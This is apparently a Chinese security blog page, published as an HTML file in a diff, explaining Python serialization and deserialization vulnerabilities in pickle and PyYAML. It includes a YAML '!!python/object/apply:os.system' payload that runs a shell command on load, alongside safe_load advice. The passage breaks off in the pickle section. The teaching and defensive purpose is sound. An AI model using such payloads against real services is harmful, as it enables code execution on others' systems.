@@ -1,0 +1,1597 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Python 反序列化漏洞\r什么是Python的序列化与反序列化\r什么是Python的序列化\r众所周知，Python是一种面向对象的语言。在Python中，一切皆对象。数字，字符串，函数，模块等等，都是对象。对象的本质是内存中的一个数据结构，包含属性（数据）和方法（操作）。\n">
+<title>Python反序列化</title>
+
+<link rel='canonical' href='https://Oight.github.io/p/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="Python反序列化">
+<meta property='og:description' content="Python 反序列化漏洞\r什么是Python的序列化与反序列化\r什么是Python的序列化\r众所周知，Python是一种面向对象的语言。在Python中，一切皆对象。数字，字符串，函数，模块等等，都是对象。对象的本质是内存中的一个数据结构，包含属性（数据）和方法（操作）。\n">
+<meta property='og:url' content='https://Oight.github.io/p/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
+<meta property='og:site_name' content='Oight'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-01T10:29:18&#43;08:00'/><meta property='article:modified_time' content='2025-06-01T10:29:18&#43;08:00'/>
+<meta name="twitter:title" content="Python反序列化">
+<meta name="twitter:description" content="Python 反序列化漏洞\r什么是Python的序列化与反序列化\r什么是Python的序列化\r众所周知，Python是一种面向对象的语言。在Python中，一切皆对象。数字，字符串，函数，模块等等，都是对象。对象的本质是内存中的一个数据结构，包含属性（数据）和方法（操作）。\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_37edead8cd3c258e.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Oight</a></h1>
+            <h2 class="site-description">talk is cheap, show me the code.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/696224138'
+                        target="_blank"
+                        title="bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Oight'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#什么是python的序列化与反序列化">什么是Python的序列化与反序列化</a>
+      <ol>
+        <li><a href="#什么是python的序列化">什么是Python的序列化</a></li>
+        <li><a href="#什么是python的反序列化">什么是Python的反序列化</a></li>
+        <li><a href="#序列化的本质">序列化的本质</a></li>
+        <li><a href="#python中序列化的实现过程">Python中序列化的实现过程</a></li>
+        <li><a href="#python中反序列化实现过程">Python中反序列化实现过程</a>
+          <ol>
+            <li><a href="#yaml-反序列化实现">YAML 反序列化实现</a></li>
+            <li><a href="#pickle-反序列化实现">Pickle 反序列化实现</a></li>
+            <li><a href="#反序列化漏洞的成因">反序列化漏洞的成因</a></li>
+          </ol>
+        </li>
+        <li><a href="#python反序列化漏洞的利用">Python反序列化漏洞的利用</a>
+          <ol>
+            <li><a href="#yaml漏洞的利用">yaml漏洞的利用</a></li>
+            <li><a href="#pickle-漏洞利用">Pickle 漏洞利用</a></li>
+          </ol>
+        </li>
+        <li><a href="#1-常见的可调用对象类型"><strong>1. 常见的可调用对象类型</strong></a>
+          <ol>
+            <li><a href="#1-函数function"><strong>(1) 函数（Function）</strong></a></li>
+            <li><a href="#2-类class"><strong>(2) 类（Class）</strong></a></li>
+            <li><a href="#3-方法method"><strong>(3) 方法（Method）</strong></a></li>
+            <li><a href="#4-实现了"><strong>(4) 实现了 <code>__call__</code> 方法的对象</strong></a></li>
+            <li><a href="#5-其他内置可调用对象"><strong>(5) 其他内置可调用对象</strong></a></li>
+          </ol>
+        </li>
+        <li><a href="#2-如何判断一个对象是否可调用"><strong>2. 如何判断一个对象是否可调用？</strong></a></li>
+        <li><a href="#3-不可调用的对象示例"><strong>3. 不可调用的对象示例</strong></a></li>
+        <li><a href="#4-callable-的实际应用场景"><strong>4. Callable 的实际应用场景</strong></a></li>
+        <li><a href="#总结"><strong>总结</strong></a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Python反序列化</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-06-01</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 10 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="python-反序列化漏洞">Python 反序列化漏洞
+</h1><h2 id="什么是python的序列化与反序列化">什么是Python的序列化与反序列化
+</h2><h3 id="什么是python的序列化">什么是Python的序列化
+</h3><p>众所周知，Python是一种面向对象的语言。在Python中，一切皆对象。数字，字符串，函数，模块等等，都是对象。对象的本质是内存中的一个数据结构，包含属性（数据）和方法（操作）。</p>
+<p>由于Python中对象的形式多种多样，变化万千，在存储时按照原本的形式来存储过于庞大且麻烦，所以我们就需要把Python对象转换为可存储或可传输的标准化格式。将Python对象转换为可存储或传输的标准化格式（如字节流、字符串）的过程，就叫做Python的序列化。</p>
+<h3 id="什么是python的反序列化">什么是Python的反序列化
+</h3><p>既然为了存储和传输方便，将Python对象通过序列化的方式转换成了一种标准化的格式，那么在程序执行时，我们就需要把标准化格式还原为Python对象，而这个过程，就叫做Python的反序列化。</p>
+<h3 id="序列化的本质">序列化的本质
+</h3><ul>
+<li>序列化的本质是将对象的状态或数据结构转换为一种通用格式（如二进制，JSON，XML），使其可以保存到文件、数据库或通过网络传输。</li>
+<li>反序列化是逆过程，将序列化后的数据还原为原始对象。</li>
+</ul>
+<h3 id="python中序列化的实现过程">Python中序列化的实现过程
+</h3><p>Python庞大的库，为Python强大的功能实现提供支撑和保障。同样的，Python中序列化和反序列化的实现也是通过一些库和模块来实现的。</p>
+<ol>
+<li>pickle模块
+作为Python的原生模块，pickle支持几乎所有的Python对象
+使用pickle进行序列化生成的是二进制格式数据</li>
+</ol>
+<p>代码示例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import pickle
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">data = {&#34;name&#34;: &#34;Alice&#34;, &#34;age&#34;: 30}
+</span></span><span class="line"><span class="cl">serialized_data = pickle.dumps(data)  # 序列化为字节流
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 保存到文件
+</span></span><span class="line"><span class="cl">with open(&#34;data.pkl&#34;, &#34;wb&#34;) as f:
+</span></span><span class="line"><span class="cl">    pickle.dump(data, f)  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>json模块
+json可以生成人类可读的JSON字符串
+但json只支持基础类型（字典、列表、字符串、数字等），不支持Python特有对象（如类实例）的序列化。</li>
+</ol>
+<p>代码示例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import json
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">data = {&#34;name&#34;: &#34;Bob&#34;, &#34;age&#34;: 25}
+</span></span><span class="line"><span class="cl">json_str = json.dumps(data)  # 序列化为JSON字符串
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 保存到文件
+</span></span><span class="line"><span class="cl">with open(&#34;data.json&#34;, &#34;w&#34;) as f:
+</span></span><span class="line"><span class="cl">    json.dump(data, f)  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>PyYAML库
+YAML（YAML Ain’t Markup Language）是一种人类可读的数据序列化格式，常用于配置文件和数据交换。Python 中通过 PyYAML 库支持 YAML。</li>
+</ol>
+<p>序列化实现：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import yaml
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">data = {
+</span></span><span class="line"><span class="cl">    &#34;name&#34;: &#34;Alice&#34;,
+</span></span><span class="line"><span class="cl">    &#34;age&#34;: 30,
+</span></span><span class="line"><span class="cl">    &#34;skills&#34;: [&#34;Python&#34;, &#34;YAML&#34;],
+</span></span><span class="line"><span class="cl">    &#34;address&#34;: {&#34;city&#34;: &#34;Shanghai&#34;, &#34;zip&#34;: 200000}
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 序列化为YAML字符串
+</span></span><span class="line"><span class="cl">yaml_str = yaml.dump(data, default_flow_style=False)
+</span></span><span class="line"><span class="cl">print(yaml_str)  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">address:
+</span></span><span class="line"><span class="cl">city: Shanghai
+</span></span><span class="line"><span class="cl">zip: 200000
+</span></span><span class="line"><span class="cl">age: 30
+</span></span><span class="line"><span class="cl">name: Alice
+</span></span><span class="line"><span class="cl">skills:
+</span></span><span class="line"><span class="cl">- Python
+</span></span><span class="line"><span class="cl">- YAML  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>保存/读取文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 写入文件</span>
+</span></span><span class="line"><span class="cl"><span class="n">with</span> <span class="n">open</span><span class="p">(</span><span class="s2">&#34;data.yaml&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="n">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 读取文件</span>
+</span></span><span class="line"><span class="cl"><span class="n">with</span> <span class="n">open</span><span class="p">(</span><span class="s2">&#34;data.yaml&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="n">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">loaded_from_file</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">safe_load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>使用 Protocol Buffers（protobuf）实现序列化
+Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高性能通信和跨语言数据交换。需预先定义数据结构（.proto 文件）。</li>
+</ol>
+<h3 id="python中反序列化实现过程">Python中反序列化实现过程
+</h3><p>在以上Python序列化实现过程中，使用pickle模块和Pyyaml库，在实现反序列化的过程中存在安全风险。我们先来看看他们的反序列化过程是如何实现的</p>
+<h4 id="yaml-反序列化实现">YAML 反序列化实现
+</h4><p>YAML的反序列化过程通过PyYAML库实现，本质是将YAML文本解析为Python对象。默认的 <code>yaml.load()</code> 方法支持动态构造Python对象（包括类实例），但这也带来了安全风险。</p>
+<h5 id="反序列化步骤">反序列化步骤：
+</h5><p>1.安装依赖</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pip install pyyaml  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.基础反序列化（安全模式）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">yaml</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># YAML 文本（仅包含基础类型）</span>
+</span></span><span class="line"><span class="cl"><span class="n">yaml_text</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">name: Alice
+</span></span></span><span class="line"><span class="cl"><span class="s2">age: 30
+</span></span></span><span class="line"><span class="cl"><span class="s2">skills:
+</span></span></span><span class="line"><span class="cl"><span class="s2">- Python
+</span></span></span><span class="line"><span class="cl"><span class="s2">- YAML
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 安全反序列化：仅解析基本类型（字典、列表等）</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">safe_load</span><span class="p">(</span><span class="n">yaml_text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">])</span>  <span class="c1"># 输出 Alice  </span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>3.动态对象反序列化（危险！）：</p>
+<p>  YAML 可以通过标签<code>（!!python/object）</code>动态构造 Python 对象，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 恶意示例：反序列化时执行代码
+</span></span><span class="line"><span class="cl">!!python/object/apply:os.system [&#34;echo &#39;Hacked!&#39;&#34;]  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>  危险的反序列化代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 不要对不可信数据使用 yaml.load()！</span>
+</span></span><span class="line"><span class="cl"><span class="n">malicious_yaml</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">!!python/object/apply:os.system [&#34;echo &#39;Hacked!&#39;&#34;]
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">malicious_yaml</span><span class="p">,</span> <span class="n">Loader</span><span class="o">=</span><span class="n">yaml</span><span class="o">.</span><span class="n">UnsafeLoader</span><span class="p">)</span>  <span class="c1"># 输出 Hacked!  </span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>安全实践</p>
+<p>  始终使用 <code>yaml.safe_load()</code>：仅解析基础类型（字典、列表、字符串、数字），禁止动态对象构造。</p>
+<p>  禁用危险标签：若必须解析对象，需自定义加载器，过滤允许的类。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">yaml</span> <span class="n">import</span> <span class="n">SafeLoader</span><span class="p">,</span> <span class="ne">Node</span><span class="p">,</span> <span class="n">Constructor</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">RestrictedLoader</span><span class="p">(</span><span class="n">SafeLoader</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">construct_python_object</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">node</span><span class="p">:</span> <span class="ne">Node</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">raise</span> <span class="n">yaml</span><span class="o">.</span><span class="n">ConstructorError</span><span class="p">(</span><span class="s2">&#34;禁止动态对象构造&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 注册自定义加载器</span>
+</span></span><span class="line"><span class="cl"><span class="n">RestrictedLoader</span><span class="o">.</span><span class="n">add_constructor</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tag:yaml.org,2002:python/object&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">RestrictedLoader</span><span class="o">.</span><span class="n">construct_python_object</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">yaml_text</span><span class="p">,</span> <span class="n">Loader</span><span class="o">=</span><span class="n">RestrictedLoader</span><span class="p">)</span>  <span class="c1"># 安全加载  </span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="pickle-反序列化实现">Pickle 反序列化实现
+</h4><p>Pickle 的反序列化通过 <code>pickle.load()</code> 或 <code>pickle.loads()</code> 实现，其底层会重建对象的完整状态，包括调用<code>__reduce__</code>方法（若存在），从而可能执行任意代码。</p>
+<h5 id="反序列化步骤-1">反序列化步骤：
+</h5><p>1.序列化一个对象：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
